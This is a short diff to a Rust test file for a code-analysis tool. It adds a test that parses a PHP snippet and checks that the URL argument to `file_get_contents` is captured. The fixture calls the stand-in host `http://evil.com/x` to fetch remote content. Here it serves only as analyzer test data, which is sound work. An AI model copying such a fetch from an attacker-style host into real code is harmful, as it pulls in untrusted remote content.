@@ -688,3 +688,16 @@ fn xor_mod_loop_is_detected() {
     let plain = open_with_path(std::path::Path::new("p.py"), b"x = a ^ b\n").unwrap();
     assert_eq!(plain.metrics().get("ast.xor_mod_loop_count"), None);
 }
+
+#[test]
+fn php_call_string_arg_value_is_captured() {
+    let src = br#"<?php $d = file_get_contents("http://evil.com/x");"#;
+    let p = open_with_path(std::path::Path::new("f.php"), src).unwrap();
+    let arg = p.symbols().iter_kind(SymbolKind::Call).find_map(|s| match s {
+        Symbol::Call { target: Some(t), args, .. } if t == "file_get_contents" => Some(args.clone()),
+        _ => None,
+    }).expect("file_get_contents call");
+    assert!(matches!(arg.first(), Some(filefacts::Arg::String { value }) if value.contains("http://evil.com")),
+        "PHP string arg value should be captured: {arg:?}");
+}
+
